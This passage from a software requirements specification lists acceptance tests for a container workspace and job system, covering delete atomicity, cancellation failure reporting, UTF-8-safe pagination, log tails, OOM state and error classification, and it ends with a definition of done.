pre-existing `job_id` SHALL each fail closed.

### RAT-012 Delete cannot wedge
A `delete` whose cache-volume removal fails SHALL leave either a complete
workspace or no workspace — never a `DELETING` row with no container. **(adversarial)**

### RAT-013 An unreachable daemon is not a successful termination
With `exec_inspect` raising, a cancellation SHALL report failure, and the job
SHALL NOT be marked `CANCELED`. **(adversarial)**

### RAT-014 Pagination is character-safe under invalid bytes
A diff containing invalid UTF-8 followed by multi-byte characters SHALL
reassemble byte-identically and produce no replacement characters beyond those in
the unpaginated read, for every `max_bytes` from 1 to 64. **(adversarial)**

### RAT-015 Pagination always advances
`max_bytes=0` SHALL be rejected; no ranged read SHALL return
`next_offset == offset` while `truncated` is true.

### RAT-016 Text at a limit boundary is text
A UTF-8 file whose `max_read_bytes` boundary falls mid-character SHALL be
reported as truncated text with content, not as binary. **(adversarial)**

### RAT-017 The tail is whole lines
`read_log_tail` composed with `tail_text` SHALL return exactly `max_lines`
complete lines, for every line width from 1 to 2× the initial chunk size, at a
nonzero backward offset. **(adversarial)**

### RAT-018 OOM is current state
A workspace that OOMs and is then reopened successfully SHALL report
`oom_killed: false` while running. **(adversarial)**

### RAT-019 A local permission error is not an auth failure
A fetch failing with a local `Permission denied` SHALL NOT be reported as
`GIT_AUTH_FAILED`. **(adversarial)**

### RAT-020 A production volume survives a suite run
A volume matching the deterministic production name for a repository the suite
also uses SHALL survive a full suite run. **(adversarial)**

---

## 18. Definition of done

Both Critical requirements are closed and covered by RAT-001..RAT-004; every
`SHALL` above is implemented or explicitly deferred with a reason; every test in
RR-026's table exercises its adversarial input; every fix in RR-027 fails the
suite when reverted; §16's amendments are applied; and no statement in any
document overstates what the code does.
